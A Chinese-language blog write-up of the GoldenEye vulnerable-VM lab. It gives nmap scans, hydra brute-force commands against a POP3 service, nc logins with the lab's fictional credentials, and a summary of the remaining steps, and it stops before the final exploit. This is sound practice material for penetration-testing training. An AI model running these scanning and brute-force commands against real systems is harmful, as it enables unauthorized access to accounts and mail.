---
title: goldeneye靶场
datas: 2024.6.21
tags:
  - 靶场
categories: 靶场
keywords:
description: Goldeneye

---

# goldeneye靶场
## 基础操作

下载，解压，vmware扫描，打开，这些就不修要我过多叙述

记得将其设置程net网关

打开攻击机(kali)
```
ifconfig #查看自己的ip
```

```经典nmap
nmap -sP 192.168.241.0/24   # 扫描当前网段下存活主机
nmap 192.168.241.132 扫描该主机
```
nmap用法

[nmap](https://blog.csdn.net/smli_ng/article/details/105964486)

[nmap命令-----基础用法 ](https://www.cnblogs.com/nmap/p/6232207.html)

![](https://pic.imgdb.cn/item/66703c38d9c307b7e9a7cc5b.png)

扫描出来发现开放了25以及80端口，包访问80的

![](https://pic.imgdb.cn/item/66703cbad9c307b7e9a90cf8.png)

按照他的试试访问/sev-home/,有一个登录框提示，所以我们要找到账号密码，回到http://192.168.241.132/

查看源码发现里面有个js文件，进去看一眼发现一段备注，里面掺杂一个html编码

![](https://pic.imgdb.cn/item/667042c9d9c307b7e9b5fa3f.png)

包登录的老弟，账密是boris/InvincibleHack3r


```
hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3
这里面-L -P是读取文本信息，-l是直接输入账号就好，最后的pop3，如果要爆破数据库就是mysql，爆啥写啥
```
![](https://pic.imgdb.cn/item/66705190d9c307b7e9d3fefc.png)


应该是能爆破出两个的（他说2-5分钟我都等了快十分钟了还是只爆破出了batalya/bird）

（看了视频才知道还是有另一个boris/sectet1!)



![](https://pic.imgdb.cn/item/667051ded9c307b7e9d47ef5.png)

登录boris
```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.241.132 55007
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass sectet1!
+OK Logged in.
```

查看里面的东西
```
list
+OK 3 messages:
1 544
2 373
3 921
.
retr 1   #查看1文件
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
一个管理员发给boris的看着没有什么用处

retr 2#查看2文件
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.

natalya发给boris的说我可以渗透进你的系统，正好和之前的natalya数可以渗透进你的系统一样
正好爆出natalya的尼玛我们一会试试

retr 3  #查看3文件
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

安全性问题，看这么没什么东西
```

登录natalya
```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.241.132 55007
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr  2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

```
第一封看着没什么东西，但是第二封信就很有搞头了

给了账号密码

给了个内部域的登录，并且提示我们要改hosts

gedit /etc/hosts

改了以后登录

http://severnaya-station.com/gnocertdir/

进入后台
![](https://pic.imgdb.cn/item/667052dad9c307b7e9d7086c.png)

使用natalya的账号密码登录

发现一个邮件
![](https://pic.imgdb.cn/item/6670552ed9c307b7e9dc2e08.png)
查看
![](https://pic.imgdb.cn/item/66705513d9c307b7e9dbf740.png)
发现一个新的名字
```doak```

```开爆
┌──(root㉿kali)-[~]
└─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3
```

后面我做完了其实，但是第二天因为一些奇奇怪怪的问题电脑爆了重装了系统，前天写完忘了传丢在桌面就无了


~~（fleet能不能出个记录啊）~~

后面就是在doak登录，看邮件，邮件里面给了个账号密码，之后登录网站后台，印象中是有一个图片，能用exiftool
解析出base64加密的网站后台密码，登录，看到版本号，google搜moodle漏洞，


后面我就不再打一遍了~~（问就是懒）~~
[goldeneye]（https://blog.csdn.net/weixin_39368364/article/details/119462349）
师傅写的满详细的，后面不会照着看就行，印象中最后是永恒之蓝的洞？